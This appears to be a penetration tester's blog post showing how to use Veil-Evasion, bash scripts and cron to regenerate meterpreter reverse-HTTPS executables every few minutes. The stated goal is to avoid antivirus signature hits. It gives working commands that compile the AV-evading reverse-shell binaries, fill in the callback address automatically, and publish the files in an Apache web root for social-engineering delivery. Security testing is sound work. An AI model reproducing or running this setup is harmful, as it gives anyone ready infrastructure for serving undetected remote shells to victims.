---
layout: post
title: Fresh Veil
subtitle: Automatically Generating Payloads
summary: Keep your Veil payloads fresh to avoid getting caught by AV.
featuredimage: /assets/freshveil1.png
tags:
- veil
- payloads
---

Veil is awesome - it makes payload generation easy and supports a wide variety of payloads with new ones being dropped pretty often.

Getting caught by AV during a test is not awesome.

Being caught because the target’s AV had a signature hit on you is even worse. Because YOU (the tester) messed up. You didn’t take the extra few minutes to regenerate a payload. I’ve been there and I’m sure you’ve been there. It sucks and you feel silly.

The solution? Use Veil’s command line options and cron to regenerate payloads every 30 minutes. 

**Server Build**

This is the basic build. Let’s assume that you have a server that you catch social engineering payloads on. Static IP (or domain).

For setup, make a directory called `/root/payload_temp` and use git to clone Veil-Evasion into that folder. Run through the setup script in Veil-Evasion/setup. 

The `/root/payload_temp` directory is where we’ll generate the payload before we move it to our apache root.


Let’s take a look at Veil’s command line options:
![Veil's Commandline Options](/assets/freshveil/freshveil1.png)


Using these options, you can generate any payload from within Veil from the command line.


For the example code below we’ll make a `python/meterpreter/rev_https_contained` payload:

```python
python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=X.X.X.X LPORT=443 --overwrite
```

The `--overwrite` is necessary here to ensure that the new payloads replace the old ones. You will of course need to replace the X.X.X.X with your WAN IP or local IP if running it within a private network.

With the Veil command figured out, create a bash script called `/payload_gen.sh` to generate the payload and move it to the apache root:

```bash
#!/bin/bash
cd /root/payload_temp
python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=X.X.X.X LPORT=443 -o /root/payload_temp/FreshPayload --overwrite
sleep 1
mv -f /root/veil-output/compiled/payload.exe /var/www/FreshPayload.exe
```

Now we’ll add this to the cron:

`crontab -e` will bring up the cron settings. In the first two blank lines enter:

```bash
10 * * * * /payload_gen.sh
40 * * * * /payload_gen.sh
```


This will make the script run twice an hour at the 10 and 40 minute marks. You can heavily customize the timing options using cron, but this is a basic implementation.


That’s it. Easy, right?

Good. Moving on…

**Variable IP Auto-Generation**

Chances are, you’re in and out of networks that you’re testing and it’s no fun to find a possible vector that needs a binary and then have to go through the whole process of generating the payload before you can test.


So `payload_gen2.sh` will pull the active eth0 IPv4 address and plug it into the same script:

```bash
#!/bin/bash
ADDY=$(ifconfig eth0 | awk '/inet addr/{print $2}' | awk -F':' '{print $2}')
cd /root/payload_temp
python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=$ADDY LPORT=443 --overwrite
sleep 1
mv -f /root/veil-output/compiled/payload.exe /var/www/FreshPayload.exe
```


For the crontab on this payload, I personally have it regenerate every minute so I never need to think about whether I got a new IP since it generated. Edit crontab using `crontab -e` and place the following code at the bottom:
`* * * * * /payload_gen2.sh`


You could, of course, stack multiple payloads of different types (perhaps with some additional post-processing) in this script so you get a full, fresh set of all of the many payload types that Veil can generate. All ready for you in your Apache folder.

